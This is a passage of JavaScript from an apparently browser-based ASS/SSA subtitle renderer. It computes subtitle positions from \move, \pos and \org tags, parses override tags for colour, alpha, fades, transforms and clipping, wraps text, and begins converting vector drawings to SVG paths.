                        const moveMatch = line.Text.match(/\\move\s*\(\s*(-?\d+(\.\d+)?)\s*,\s*(-?\d+(\.\d+)?)\s*,\s*(-?\d+(\.\d+)?)\s*,\s*(-?\d+(\.\d+)?)\s*(?:,\s*(-?\d+)\s*,\s*(-?\d+)\s*)?\)/);
                        
                        let effectivePos = null;

                        if (moveMatch) {
                            const x1 = parseFloat(moveMatch[1]);
                            const y1 = parseFloat(moveMatch[3]);
                            const x2 = parseFloat(moveMatch[5]);
                            const y2 = parseFloat(moveMatch[7]);
                            const t1 = moveMatch[9] ? parseInt(moveMatch[9]) : 0;
                            const t2 = moveMatch[10] ? parseInt(moveMatch[10]) : 0; // If 0/missing, implies duration? Spec says "0 is same as first version" which means duration

                            // Calculate current position
                            const lineStartMs = parseTime(line.Start);
                            const lineEndMs = parseTime(line.End);
                            const duration = lineEndMs - lineStartMs;
                            const currentTimeRel = this.currentTime - lineStartMs;

                            const moveStartTime = t1;
                            const moveEndTime = (t2 > 0) ? t2 : duration;
                            
                            let progress = 0;
                            if (currentTimeRel <= moveStartTime) progress = 0;
                            else if (currentTimeRel >= moveEndTime) progress = 1;
                            else progress = (currentTimeRel - moveStartTime) / (moveEndTime - moveStartTime);

                            const curX = x1 + (x2 - x1) * progress;
                            const curY = y1 + (y2 - y1) * progress;
                            
                            effectivePos = { x: curX, y: curY };
                        } else if (posMatch) {
                            effectivePos = { x: parseFloat(posMatch[1]), y: parseFloat(posMatch[3]) };
                        }

                        if (effectivePos) {
                            const x = effectivePos.x;
                            const y = effectivePos.y;
                            
                            // Map alignment to transform
                            let transX = '-50%';
                            let transY = '-50%';
                            
                            if ([1, 4, 7].includes(alignment)) transX = '0%';
                            if ([3, 6, 9].includes(alignment)) transX = '-100%';
                            
                            if ([1, 2, 3].includes(alignment)) transY = '-100%'; // Bottom anchored
                            if ([7, 8, 9].includes(alignment)) transY = '0%';    // Top anchored
                            
                            const clamp = (v, min, max) => Math.min(Math.max(v, min), max);
                            let scaledX = x * this.scriptScaleX;
                            let scaledY = y * this.scriptScaleY;
                            const containerW = Math.floor(this.dummyVideo.containerWidth || 0);
                            const containerH = Math.floor(this.dummyVideo.containerHeight || 0);

                            if (containerW > 0 && containerH > 0) {
                                let fontSize = s ? parseFloat(s.Fontsize) : 20;
                                const fsTag = line.Text.match(/\\fs(\d+(\.\d+)?)/);
                                if (fsTag) fontSize = parseFloat(fsTag[1]);
                                if (!Number.isFinite(fontSize) || fontSize <= 0) fontSize = 20;

                                let scaleX = s ? (parseFloat(s.ScaleX || 100) / 100) : 1;
                                let scaleY = s ? (parseFloat(s.ScaleY || 100) / 100) : 1;
                                const fscxTag = line.Text.match(/\\fscx(\d+(\.\d+)?)/);
                                const fscyTag = line.Text.match(/\\fscy(\d+(\.\d+)?)/);
                                if (fscxTag) scaleX = parseFloat(fscxTag[1]) / 100;
                                if (fscyTag) scaleY = parseFloat(fscyTag[1]) / 100;
                                if (!Number.isFinite(scaleX) || scaleX <= 0) scaleX = 1;
                                if (!Number.isFinite(scaleY) || scaleY <= 0) scaleY = 1;

                                const fontPx = fontSize * this.fontScaleFactor * scaleY;

                                let plain = (line.Text || '').replace(/\{[^}]*\}/g, '');
                                plain = plain.replace(/\\h/g, ' ');
                                plain = plain.replace(/\\N/g, '\n');
                                plain = plain.replace(/\\n/g, '\n');
                                const lines = plain.split('\n');
                                const lineCount = Math.max(1, lines.length);

                                const isBold = s ? String(s.Bold) === '-1' : false;
                                const isItalic = s ? String(s.Italic) === '-1' : false;
                                const fontName = s ? (s.Fontname || 'Arial') : 'Arial';
                                const fontWeight = isBold ? 700 : 400;
                                const fontStyle = isItalic ? 'italic' : 'normal';

                                if (!this._assMeasureCtx) {
                                    const c = document.createElement('canvas');
                                    this._assMeasureCtx = c.getContext('2d');
                                }

                                let maxTextW = 0;
                                if (this._assMeasureCtx) {
                                    this._assMeasureCtx.font = `${fontStyle} ${fontWeight} ${Math.max(1, fontPx)}px ${this.getFontFamilyStack(fontName)}`;
                                    for (const l of lines) {
                                        const w = this._assMeasureCtx.measureText(l || '').width || 0;
                                        if (w > maxTextW) maxTextW = w;
                                    }
                                }
                                if (!Number.isFinite(maxTextW) || maxTextW <= 0) {
                                    maxTextW = Math.max(1, ...lines.map(l => (l || '').length)) * Math.max(1, fontPx) * 0.7;
                                }

                                const approxW = maxTextW * scaleX;
                                const approxH = lineCount * fontPx * 1.35;

                                const outline = s ? parseFloat(s.Outline) : 2;
                                const shadow = s ? parseFloat(s.Shadow) : 2;
                                const extraPad = (Number.isFinite(outline) ? outline : 0) * Math.max(this.scriptScaleX, this.scriptScaleY)
                                    + (Number.isFinite(shadow) ? shadow : 0) * Math.max(this.scriptScaleX, this.scriptScaleY);

                                const safeMargin = Math.max(2, Math.round(fontPx * 0.15));
                                const boxW = Math.max(1, approxW + extraPad * 2 + safeMargin * 2);
                                const boxH = Math.max(1, approxH + extraPad * 2 + safeMargin * 2);

                                const ax = transX === '0%' ? 0 : (transX === '-100%' ? 1 : 0.5);
                                const ay = transY === '0%' ? 0 : (transY === '-100%' ? 1 : 0.5);

                                const availableWForFit = Math.max(1, containerW - safeMargin * 2);
                                const availableHForFit = Math.max(1, containerH - safeMargin * 2);
                                const fitScale = Math.min(1, availableWForFit / boxW, availableHForFit / boxH);

                                const scaledBoxW = boxW * fitScale;
                                const scaledBoxH = boxH * fitScale;
                                const scaledSafeMargin = safeMargin * fitScale;

                                const minX = ax * scaledBoxW + scaledSafeMargin;
                                const maxX = containerW - (1 - ax) * scaledBoxW - scaledSafeMargin;
                                const minY = ay * scaledBoxH + scaledSafeMargin;
                                const maxY = containerH - (1 - ay) * scaledBoxH - scaledSafeMargin;

                                if (Number.isFinite(minX) && Number.isFinite(maxX) && minX <= maxX) {
                                    scaledX = clamp(scaledX, minX, maxX);
                                }
                                if (Number.isFinite(minY) && Number.isFinite(maxY) && minY <= maxY) {
                                    scaledY = clamp(scaledY, minY, maxY);
                                }

                                if (Number.isFinite(minX) && Number.isFinite(maxX) && minX > maxX) {
                                    scaledX = ax === 0 ? scaledSafeMargin : (ax === 1 ? (containerW - scaledSafeMargin) : (containerW / 2));
                                }
                                if (Number.isFinite(minY) && Number.isFinite(maxY) && minY > maxY) {
                                    scaledY = ay === 0 ? scaledSafeMargin : (ay === 1 ? (containerH - scaledSafeMargin) : (containerH / 2));
                                }

                                if (fitScale < 1) {
                                    const originX = ax === 0 ? '0%' : (ax === 1 ? '100%' : '50%');
                                    const originY = ay === 0 ? '0%' : (ay === 1 ? '100%' : '50%');
                                    style.transformOrigin = `${originX} ${originY}`;
                                    style.transform = `translate(${transX}, ${transY}) scale(${fitScale})`;
                                }
                            }

                            style.left = `${scaledX}px`;
                            style.top = `${scaledY}px`;
                            style.width = 'max-content';
                            if (!style.transform) style.transform = `translate(${transX}, ${transY})`;
                            // Check for \org(x,y) to set transform-origin
                            if ([1, 4, 7].includes(alignment)) style.textAlign = 'left';
                            if ([3, 6, 9].includes(alignment)) style.textAlign = 'right';

                            const orgMatch = line.Text.match(/\\org\s*\(\s*(-?\d+(\.\d+)?)\s*,\s*(-?\d+(\.\d+)?)\s*\)/);
                            if (orgMatch) {
                                const orgX = parseFloat(orgMatch[1]) * this.scriptScaleX;
                                const orgY = parseFloat(orgMatch[3]) * this.scriptScaleY;
                                
                                // transform-origin is relative to the element's box (top-left corner of the element).
                                // But here style.left/top places the element's ANCHOR point at scaledX, scaledY.
                                // The element's top-left corner depends on the transform (transX, transY).
                                // This is getting complicated to calculate in CSS exactly without knowing the element width/height.
                                // However, if we assume the element is positioned at style.left/top, 
                                // and we want the rotation pivot to be at orgX, orgY.
                                // CSS transform-origin: "offset-x offset-y".
                                // Offset from what? From the element's top-left.
                                // We don't know the element's width/height here (it's dynamic).
                                // BUT, we can use a wrapper or assume the transform-origin is relative to the anchor?
                                // Actually, standard CSS transform-origin is relative to the element's border-box.
                                // Without JS measuring the element size, we can't set exact transform-origin relative to a global coordinate if we rely on % transforms for centering.
                                // LIMITATION: For now, \org might be inaccurate for centered text unless we calculate layout.
                                // Alternative: Use a nested structure where the outer div is at \org and inner div is offset?
                                // Too complex for this dummy video. 
                                // Let's skip \org exact math for now or try a best effort if alignment is Top-Left (where we know the top-left).
                                
                                // If we assume alignment 7 (Top-Left), element top-left is at scaledX, scaledY.
                                // origin offset = (orgX - scaledX)px (orgY - scaledY)px.
                                if (alignment === 7) {
                                    style.transformOrigin = `${orgX - scaledX}px ${orgY - scaledY}px`;
                                }
                            }
                        } else {
                            let marginL = parseInt(line.MarginL, 10) || 0;
                            let marginR = parseInt(line.MarginR, 10) || 0;
                            let marginV = parseInt(line.MarginV, 10) || 0;
                            if (s) {
                                if (marginL === 0) marginL = parseInt(s.MarginL, 10) || 0;
                                if (marginR === 0) marginR = parseInt(s.MarginR, 10) || 0;
                                if (marginV === 0) marginV = parseInt(s.MarginV, 10) || 0;
                            }

                            style.left = `${marginL * this.scriptScaleX}px`;
                            style.right = `${marginR * this.scriptScaleX}px`;
                            style.width = 'auto';

                            const clamp = (v, min, max) => Math.min(Math.max(v, min), max);
                            const containerH = Math.floor(this.dummyVideo.containerHeight || 0);
                            const containerW = Math.floor(this.dummyVideo.containerWidth || 0);
                            const availableW = containerW > 0
                                ? Math.max(1, containerW - (marginL + marginR) * this.scriptScaleX)
                                : 0;

                            const estimateLineBoxHeightPx = (l) => {
                                let fontSize = s ? parseFloat(s.Fontsize) : 20;
                                const fsTag = l.Text.match(/\\fs(\d+(\.\d+)?)/);
                                if (fsTag) fontSize = parseFloat(fsTag[1]);
                                if (!Number.isFinite(fontSize) || fontSize <= 0) fontSize = 20;

                                let scaleY = s ? (parseFloat(s.ScaleY || 100) / 100) : 1;
                                const fscyTag = l.Text.match(/\\fscy(\d+(\.\d+)?)/);
                                if (fscyTag) scaleY = parseFloat(fscyTag[1]) / 100;
                                if (!Number.isFinite(scaleY) || scaleY <= 0) scaleY = 1;

                                const fontPx = fontSize * this.fontScaleFactor * scaleY;

                                let plain = (l.Text || '').replace(/\{[^}]*\}/g, '');
                                plain = plain.replace(/\\h/g, ' ');
                                plain = plain.replace(/\\N/g, '\n');
                                plain = plain.replace(/\\n/g, '\n');
                                const logicalLines = plain.split('\n');
                                const lineCount = Math.max(1, logicalLines.length);

                                const isBold = s ? String(s.Bold) === '-1' : false;
                                const isItalic = s ? String(s.Italic) === '-1' : false;
                                const fontName = s ? (s.Fontname || 'Arial') : 'Arial';
                                const fontWeight = isBold ? 700 : 400;
                                const fontStyle = isItalic ? 'italic' : 'normal';

                                if (!this._assMeasureCtx) {
                                    const c = document.createElement('canvas');
                                    this._assMeasureCtx = c.getContext('2d');
                                }

                                let maxTextW = 0;
                                if (this._assMeasureCtx) {
                                    this._assMeasureCtx.font = `${fontStyle} ${fontWeight} ${Math.max(1, fontPx)}px ${this.getFontFamilyStack(fontName)}`;
                                    for (const t of logicalLines) {
                                        const w = this._assMeasureCtx.measureText(t || '').width || 0;
                                        if (w > maxTextW) maxTextW = w;
                                    }
                                }
                                if (!Number.isFinite(maxTextW) || maxTextW <= 0) {
                                    maxTextW = Math.max(1, ...logicalLines.map(t => (t || '').length)) * Math.max(1, fontPx) * 0.7;
                                }

                                let wrapLines = lineCount;
                                if (availableW > 0) {
                                    wrapLines = Math.max(lineCount, Math.ceil(maxTextW / availableW));
                                }

                                const outline = s ? parseFloat(s.Outline) : 2;
                                const shadow = s ? parseFloat(s.Shadow) : 2;
                                const extraPad = (Number.isFinite(outline) ? outline : 0) * Math.max(this.scriptScaleX, this.scriptScaleY)
                                    + (Number.isFinite(shadow) ? shadow : 0) * Math.max(this.scriptScaleX, this.scriptScaleY);

                                const boxH = Math.max(1, wrapLines * fontPx * 1.35 + extraPad * 2);
                                return Math.ceil(boxH);
                            };

                            const computeStackOffsetPx = (dir) => {
                                const active = this.activeSubtitles || [];
                                const idx = active.indexOf(line);
                                if (idx <= 0) return 0;

                                let offset = 0;
                                for (let i = 0; i < idx; i++) {
                                    const other = active[i];
                                    if (!other || other === line) continue;

                                    const otherText = other.Text || '';
                                    const otherHasPos = /\\pos\s*\(/.test(otherText) || /\\move\s*\(/.test(otherText);
                                    if (otherHasPos) continue;

                                    let otherAlign = 2;
                                    const otherStyle = this.styles.find(st => st.Name === other.Style);
                                    if (otherStyle) otherAlign = parseInt(otherStyle.Alignment);
                                    const otherAn = otherText.match(/\\an([1-9])/);
                                    if (otherAn) otherAlign = parseInt(otherAn[1]);
                                    if (!otherAn) {
                                        const otherA = otherText.match(/\\a(\d+)/);
                                        if (otherA) {
                                            const aVal = parseInt(otherA[1]);
                                            const legacyMap = { 1: 1, 2: 2, 3: 3, 5: 7, 6: 8, 7: 9, 9: 4, 10: 5, 11: 6 };
                                            if (legacyMap[aVal]) otherAlign = legacyMap[aVal];
                                        }
                                    }

                                    const sameBand = dir === 'top'
                                        ? [7, 8, 9].includes(otherAlign)
                                        : [1, 2, 3].includes(otherAlign);

                                    if (!sameBand) continue;
                                    offset += estimateLineBoxHeightPx(other);
                                }
                                return offset;
                            };

                            // Default positioning
                            // Map alignment to position
                            // 1,2,3 -> Bottom
                            // 4,5,6 -> Middle
                            // 7,8,9 -> Top
                            
                            if ([7, 8, 9].includes(alignment)) {
                                const base = marginV * this.scriptScaleY;
                                const offset = computeStackOffsetPx('top');
                                style.top = `${base + offset}px`;
                                style.bottom = 'auto';
                            } else if ([4, 5, 6].includes(alignment)) {
                                style.top = '50%';
                                style.transform = 'translateY(-50%)';
                            } else {
                                const base = marginV * this.scriptScaleY;
                                const offset = computeStackOffsetPx('bottom');
                                const finalBottom = containerH > 0 ? clamp(base + offset, 0, containerH) : (base + offset);
                                style.bottom = `${finalBottom}px`;
                                style.top = 'auto';
                            }
                            
                            // Horizontal alignment handled by textAlign usually for full width
                            if ([1, 4, 7].includes(alignment)) style.textAlign = 'left';
                            if ([3, 6, 9].includes(alignment)) style.textAlign = 'right';
                        }
                        return style;
                    },
                    getRenderedParts(line) {
                        if (!line) return { parts: [], clip: null };
                        if (this.libassPartsEnabled) {
                            this.renderLibassWasmParts();
                            return { parts: [], clip: null };
                        }
                        const parts = [];
                        const styleName = line.Style;
                        const lineStartMs = parseTime(line.Start);
                        const lineEndMs = parseTime(line.End);
                        const duration = lineEndMs - lineStartMs;
                        const localTime = this.currentTime - lineStartMs;
                        const baseStyle = this.styles.find(s => s.Name === styleName) || {
                            Fontname: 'Arial', Fontsize: '20', PrimaryColour: '&H00FFFFFF',
                            SecondaryColour: '&H0000FFFF', OutlineColour: '&H00000000', BackColour: '&H00000000',
                            Bold: '0', Italic: '0', Underline: '0', StrikeOut: '0',
                            ScaleX: '100', ScaleY: '100', Spacing: '0', Angle: '0',
                            BorderStyle: '1', Outline: '2', Shadow: '2', Alignment: '2'
                        };

                        // Helper to split ASS color/alpha
                        const parseColor = (c) => {
                            if (!c) return { r: 255, g: 255, b: 255 };
                            let hex = c.replace(/&H|&/g, '');
                            if (hex.length >= 8) hex = hex.substring(2);
                            if (hex.length >= 6) {
                                // BBGGRR
                                const b = parseInt(hex.substring(0, 2), 16) || 0;
                                const g = parseInt(hex.substring(2, 4), 16) || 0;
                                const r = parseInt(hex.substring(4, 6), 16) || 0;
                                return { r, g, b };
                            }
                            return { r: 255, g: 255, b: 255 };
                        };
                        
                        const parseAlpha = (c) => {
                             if (!c) return 0; // Opaque
                             const hex = c.replace(/&H|&/g, '');
                             if (hex.length >= 8) {
                                 // AABBGGRR
                                 const a = parseInt(hex.substring(0, 2), 16);
                                 return isNaN(a) ? 0 : a / 255;
                             }
                             if (hex.length <= 2) {
                                 const a = parseInt(hex, 16);
                                 return isNaN(a) ? 0 : a / 255;
                             }
                             return 0;
                        };

                        const getInitialState = (s) => ({
                            fontName: s.Fontname,
                            fontSize: parseFloat(s.Fontsize),
                            
                            c1: parseColor(s.PrimaryColour),
                            a1: parseAlpha(s.PrimaryColour),
                            
                            c2: parseColor(s.SecondaryColour || '&H0000FFFF'),
                            a2: parseAlpha(s.SecondaryColour || '&H0000FFFF'),
                            
                            c3: parseColor(s.OutlineColour || '&H00000000'),
                            a3: parseAlpha(s.OutlineColour || '&H00000000'),
                            
                            c4: parseColor(s.BackColour || '&H00000000'),
                            a4: parseAlpha(s.BackColour || '&H00000000'),
                            
                            bold: s.Bold === '-1',
                            weight: s.Bold === '-1' ? 700 : 400,
                            italic: s.Italic === '-1',
                            underline: s.Underline === '-1',
                            strikeout: s.StrikeOut === '-1',
                            
                            scaleX: parseFloat(s.ScaleX || 100) / 100,
                            scaleY: parseFloat(s.ScaleY || 100) / 100,
                            spacing: parseFloat(s.Spacing || 0),
                            angleZ: parseFloat(s.Angle || 0),
                            angleX: 0,
                            angleY: 0,
                            skewX: 0,
                            skewY: 0,
                            
                            outlineX: parseFloat(s.Outline),
                            outlineY: parseFloat(s.Outline),
                            shadowX: parseFloat(s.Shadow),
                            shadowY: parseFloat(s.Shadow),
                            blur: 0,
                            borderStyle: parseInt(s.BorderStyle || 1),
                            karaokeMode: null,
                            karaokeNextDuration: null,
                            karaokeCursor: 0,
                            wrapStyle: 0,
                            pMode: 0,
                            pbo: 0,
                            simpleFade: null,
                            complexFade: null,
                            transforms: []
                        });

                        let state = getInitialState(baseStyle);
                        let clip = null;

                        // Regex for separating {tags} and text
                        const regex = /({[^}]*})|([^{]+)/g;
                        const matches = line.Text.match(regex) || [];

                        const clamp01 = (v) => Math.max(0, Math.min(1, v));
                        const lerp = (a, b, t) => a + (b - a) * t;

                        const parseOverrideTags = (content) => {
                            const tags = [];
                            let i = 0;
                            while (i < content.length) {
                                if (content[i] !== '\\') {
                                    i += 1;
                                    continue;
                                }
                                i += 1;

                                let prefix = '';
                                if (i < content.length && /[1-4]/.test(content[i])) {
                                    prefix = content[i];
                                    i += 1;
                                }

                                let name = '';
                                while (i < content.length && /[A-Za-z]/.test(content[i])) {
                                    name += content[i];
                                    i += 1;
                                }
                                if (!name) continue;

                                const tag = `${prefix}${name}`;

                                let arg = '';
                                if (i < content.length && content[i] === '(') {
                                    const start = i;
                                    let depth = 0;
                                    while (i < content.length) {
                                        const ch = content[i];
                                        if (ch === '(') depth += 1;
                                        else if (ch === ')') {
                                            depth -= 1;
                                            if (depth === 0) {
                                                i += 1;
                                                break;
                                            }
                                        }
                                        i += 1;
                                    }
                                    arg = content.slice(start, i).trim();
                                } else {
                                    const start = i;
                                    while (i < content.length && content[i] !== '\\') i += 1;
                                    arg = content.slice(start, i).trim();
                                }

                                tags.push({ tag, arg });
                            }
                            return tags;
                        };

                        const cloneState = (s) => ({
                            ...s,
                            c1: { ...s.c1 },
                            c2: { ...s.c2 },
                            c3: { ...s.c3 },
                            c4: { ...s.c4 },
                            simpleFade: s.simpleFade ? { ...s.simpleFade } : null,
                            complexFade: s.complexFade ? { ...s.complexFade } : null,
                            transforms: Array.isArray(s.transforms) ? s.transforms.slice() : []
                        });

                        const pickTransformState = (s) => ({
                            fontSize: s.fontSize,
                            scaleX: s.scaleX,
                            scaleY: s.scaleY,
                            spacing: s.spacing,
                            angleX: s.angleX,
                            angleY: s.angleY,
                            angleZ: s.angleZ,
                            skewX: s.skewX,
                            skewY: s.skewY,
                            outlineX: s.outlineX,
                            outlineY: s.outlineY,
                            shadowX: s.shadowX,
                            shadowY: s.shadowY,
                            blur: s.blur,
                            c1: { ...s.c1 },
                            c2: { ...s.c2 },
                            c3: { ...s.c3 },
                            c4: { ...s.c4 },
                            a1: s.a1,
                            a2: s.a2,
                            a3: s.a3,
                            a4: s.a4
                        });

                        const applyTagToState = (target, tag, arg, isReset) => {
                            switch (tag) {
                                case 'fn':
                                    target.fontName = isReset ? baseStyle.Fontname : arg;
                                    break;
                                case 'fs':
                                    target.fontSize = isReset ? parseFloat(baseStyle.Fontsize) : parseFloat(arg);
                                    break;
                                case 'fscx':
                                    target.scaleX = (isReset ? parseFloat(baseStyle.ScaleX || 100) : parseFloat(arg)) / 100;
                                    break;
                                case 'fscy':
                                    target.scaleY = (isReset ? parseFloat(baseStyle.ScaleY || 100) : parseFloat(arg)) / 100;
                                    break;
                                case 'fsp':
                                    target.spacing = isReset ? parseFloat(baseStyle.Spacing || 0) : parseFloat(arg);
                                    break;
                                case 'frx':
                                    target.angleX = isReset ? 0 : parseFloat(arg);
                                    break;
                                case 'fry':
                                    target.angleY = isReset ? 0 : parseFloat(arg);
                                    break;
                                case 'frz':
                                case 'fr':
                                    target.angleZ = isReset ? parseFloat(baseStyle.Angle || 0) : parseFloat(arg);
                                    break;
                                case 'fax':
                                    target.skewX = isReset ? 0 : parseFloat(arg);
                                    break;
                                case 'fay':
                                    target.skewY = isReset ? 0 : parseFloat(arg);
                                    break;
                                case 'c':
                                case '1c':
                                    target.c1 = isReset ? parseColor(baseStyle.PrimaryColour) : parseColor(arg);
                                    break;
                                case '2c':
                                    target.c2 = isReset ? parseColor(baseStyle.SecondaryColour) : parseColor(arg);
                                    break;
                                case '3c':
                                    target.c3 = isReset ? parseColor(baseStyle.OutlineColour) : parseColor(arg);
                                    break;
                                case '4c':
                                    target.c4 = isReset ? parseColor(baseStyle.BackColour) : parseColor(arg);
                                    break;
                                case 'alpha': {
                                    const a = isReset ? 0 : parseAlpha(arg);
                                    target.a1 = target.a2 = target.a3 = target.a4 = a;
                                    break;
                                }
                                case '1a':
                                    target.a1 = isReset ? parseAlpha(baseStyle.PrimaryColour) : parseAlpha(arg);
                                    break;
                                case '2a':
                                    target.a2 = isReset ? parseAlpha(baseStyle.SecondaryColour) : parseAlpha(arg);
                                    break;
                                case '3a':
                                    target.a3 = isReset ? parseAlpha(baseStyle.OutlineColour) : parseAlpha(arg);
                                    break;
                                case '4a':
                                    target.a4 = isReset ? parseAlpha(baseStyle.BackColour) : parseAlpha(arg);
                                    break;
                                case 'bord':
                                    if (isReset) {
                                        target.outlineX = target.outlineY = parseFloat(baseStyle.Outline);
                                    } else {
                                        const v = parseFloat(arg);
                                        target.outlineX = target.outlineY = v;
                                    }
                                    break;
                                case 'xbord':
                                    target.outlineX = isReset ? parseFloat(baseStyle.Outline) : parseFloat(arg);
                                    break;
                                case 'ybord':
                                    target.outlineY = isReset ? parseFloat(baseStyle.Outline) : parseFloat(arg);
                                    break;
                                case 'shad':
                                    if (isReset) {
                                        target.shadowX = target.shadowY = parseFloat(baseStyle.Shadow);
                                    } else {
                                        const v = parseFloat(arg);
                                        target.shadowX = target.shadowY = v;
                                    }
                                    break;
                                case 'xshad':
                                    target.shadowX = isReset ? parseFloat(baseStyle.Shadow) : parseFloat(arg);
                                    break;
                                case 'yshad':
                                    target.shadowY = isReset ? parseFloat(baseStyle.Shadow) : parseFloat(arg);
                                    break;
                                case 'be':
                                case 'blur':
                                    target.blur = isReset ? 0 : parseFloat(arg);
                                    break;
                                case 'b':
                                    if (isReset) {
                                        target.bold = baseStyle.Bold === '-1';
                                        target.weight = target.bold ? 700 : 400;
                                    } else {
                                        const val = parseInt(arg);
                                        if (val === 0 || val === 1) {
                                            target.bold = val === 1;
                                            target.weight = val === 1 ? 700 : 400;
                                        } else {
                                            target.weight = val;
                                            target.bold = val >= 600;
                                        }
                                    }
                                    break;
                                case 'i':
                                    target.italic = isReset ? baseStyle.Italic === '-1' : arg === '1';
                                    break;
                                case 'u':
                                    target.underline = isReset ? baseStyle.Underline === '-1' : arg === '1';
                                    break;
                                case 's':
                                    target.strikeout = isReset ? baseStyle.StrikeOut === '-1' : arg === '1';
                                    break;
                            }
                        };

                        const applyTransformsToState = (base, tMs) => {
                            const out = cloneState(base);
                            const tf = Array.isArray(base.transforms) ? base.transforms : [];
                            for (const tr of tf) {
                                const t1 = Number.isFinite(tr.t1) ? tr.t1 : 0;
                                const t2 = Number.isFinite(tr.t2) ? tr.t2 : duration;
                                const accel = Number.isFinite(tr.accel) && tr.accel > 0 ? tr.accel : 1;

                                let p = 0;
                                if (t2 <= t1) p = tMs >= t2 ? 1 : 0;
                                else p = clamp01((tMs - t1) / (t2 - t1));
                                if (accel !== 1) p = clamp01(Math.pow(p, accel));

                                const from = tr.from;
                                const to = tr.to;
                                if (!from || !to) continue;

                                const numKeys = ['fontSize', 'scaleX', 'scaleY', 'spacing', 'angleX', 'angleY', 'angleZ', 'skewX', 'skewY', 'outlineX', 'outlineY', 'shadowX', 'shadowY', 'blur', 'a1', 'a2', 'a3', 'a4'];
                                for (const k of numKeys) {
                                    if (Number.isFinite(from[k]) && Number.isFinite(to[k])) out[k] = lerp(from[k], to[k], p);
                                }

                                const colKeys = ['c1', 'c2', 'c3', 'c4'];
                                for (const ck of colKeys) {
                                    if (!from[ck] || !to[ck]) continue;
                                    out[ck] = {
                                        r: Math.round(lerp(from[ck].r || 0, to[ck].r || 0, p)),
                                        g: Math.round(lerp(from[ck].g || 0, to[ck].g || 0, p)),
                                        b: Math.round(lerp(from[ck].b || 0, to[ck].b || 0, p))
                                    };
                                }
                            }
                            return out;
                        };

                        const computeFadeOpacity = (st, tMs) => {
                            let opacity = 1;

                            if (st.simpleFade && Number.isFinite(duration) && duration > 0) {
                                const fadeIn = Math.max(0, parseInt(st.simpleFade.fadeIn || 0, 10) || 0);
                                const fadeOut = Math.max(0, parseInt(st.simpleFade.fadeOut || 0, 10) || 0);

                                if (fadeIn > 0 && tMs < fadeIn) opacity *= clamp01(tMs / fadeIn);
                                if (fadeOut > 0 && tMs > (duration - fadeOut)) opacity *= clamp01((duration - tMs) / fadeOut);
                            }

                            if (st.complexFade) {
                                const cf = st.complexFade;
                                const a1 = Math.max(0, Math.min(255, parseInt(cf.a1, 10)));
                                const a2 = Math.max(0, Math.min(255, parseInt(cf.a2, 10)));
                                const a3 = Math.max(0, Math.min(255, parseInt(cf.a3, 10)));
                                const t1 = Math.max(0, parseInt(cf.t1, 10));
                                const t2 = Math.max(0, parseInt(cf.t2, 10));
                                const t3 = Math.max(0, parseInt(cf.t3, 10));
                                const t4 = Math.max(0, parseInt(cf.t4, 10));

                                let a = a1;
                                if (tMs < t1) a = a1;
                                else if (tMs < t2) a = t2 === t1 ? a2 : lerp(a1, a2, clamp01((tMs - t1) / (t2 - t1)));
                                else if (tMs < t3) a = a2;
                                else if (tMs < t4) a = t4 === t3 ? a3 : lerp(a2, a3, clamp01((tMs - t3) / (t4 - t3)));
                                else a = a3;

                                opacity *= clamp01(1 - (a / 255));
                            }

                            return clamp01(opacity);
                        };

                        const wrapTextByWidth = (text, maxWidth, measureWidth) => {
                            if (!Number.isFinite(maxWidth) || maxWidth <= 0) return [text];
                            const trimmed = text.trim();
                            if (!trimmed) return [text];
                            const words = trimmed.split(/\s+/);
                            const lines = [];
                            let current = '';

                            const pushCurrent = () => {
                                lines.push(current);
                                current = '';
                            };

                            for (const word of words) {
                                if (!word) continue;
                                const next = current ? `${current} ${word}` : word;
                                if (measureWidth(next) <= maxWidth) {
                                    current = next;
                                    continue;
                                }

                                if (current) pushCurrent();

                                if (measureWidth(word) <= maxWidth) {
                                    current = word;
                                    continue;
                                }

                                let piece = '';
                                for (const ch of word) {
                                    const candidate = piece + ch;
                                    if (piece && measureWidth(candidate) > maxWidth) {
                                        lines.push(piece);
                                        piece = ch;
                                    } else {
                                        piece = candidate;
                                    }
                                }
                                if (piece) current = piece;
                            }

                            if (current) lines.push(current);
                            return lines.length ? lines : [text];
                        };

                        const parseRectClip = (rawArg) => {
                            if (!rawArg) return null;
                            let inner = rawArg.trim();
                            if (inner.startsWith('(') && inner.endsWith(')')) inner = inner.slice(1, -1);
                            inner = inner.trim();
                            if (!inner) return null;
                            if (/[A-Za-z]/.test(inner)) return null;
                            const nums = inner.match(/-?\d+/g);
                            if (!nums || nums.length !== 4) return null;
                            const vals = nums.map(n => parseInt(n, 10));
                            if (vals.some(v => !Number.isFinite(v))) return null;
                            const [x1, y1, x2, y2] = vals;
                            const x = Math.min(x1, x2) * this.scriptScaleX;
                            const y = Math.min(y1, y2) * this.scriptScaleY;
                            const w = Math.abs(x2 - x1) * this.scriptScaleX;
                            const h = Math.abs(y2 - y1) * this.scriptScaleY;
                            if (!(w > 0) || !(h > 0)) return null;
                            return { kind: 'rect', x, y, w, h };
                        };

                        const buildSvgPathFromAssDrawing = (drawing, scaleDiv, yOffset) => {
                            const src = (drawing || '').trim();
                            if (!src) return '';
                            const div = Number.isFinite(scaleDiv) && scaleDiv > 0 ? scaleDiv : 1;
                            const yOff = Number.isFinite(yOffset) ? yOffset : 0;
                            const tokens = src.match(/[A-Za-z]|-?\d+(?:\.\d+)?/g) || [];
                            let i = 0;
                            let d = '';
                            let cmd = '';
                            let curX = 0;
                            let curY = 0;
                            let hasPos = false;

                            let splineActive = false;
                            let splineStart = null;
                            let splinePoints = [];

                            const isLetter = (t) => typeof t === 'string' && /^[A-Za-z]$/.test(t);
                            const nextNumber = () => {
                                while (i < tokens.length && isLetter(tokens[i])) return null;
                                if (i >= tokens.length) return null;
                                const v = parseFloat(tokens[i]);
                                i += 1;
                                return Number.isFinite(v) ? v : null;
                            };
                            const nextPoint = () => {
                                const x = nextNumber();
                                const y = nextNumber();
                                if (!Number.isFinite(x) || !Number.isFinite(y)) return null;
                                return {
                                    x: (x / div) * this.scriptScaleX,
                                    y: ((y + yOff) / div) * this.scriptScaleY
                                };
                            };
                            const extendSplineTo = (pt) => {
                                if (!pt) return;
                                splinePoints.push(pt);
                                const n = splinePoints.length;
                                if (n < 3) return;
                                const c1 = splinePoints[n - 3];
                                const c2 = splinePoints[n - 2];
                                const end = splinePoints[n - 1];
                                d += ` C ${c1.x} ${c1.y} ${c2.x} ${c2.y} ${end.x} ${end.y}`;
                                curX = end.x;
                                curY = end.y;
                                hasPos = true;
                            };

                            while (i < tokens.length) {
                                const t = tokens[i];
                                if (isLetter(t)) {
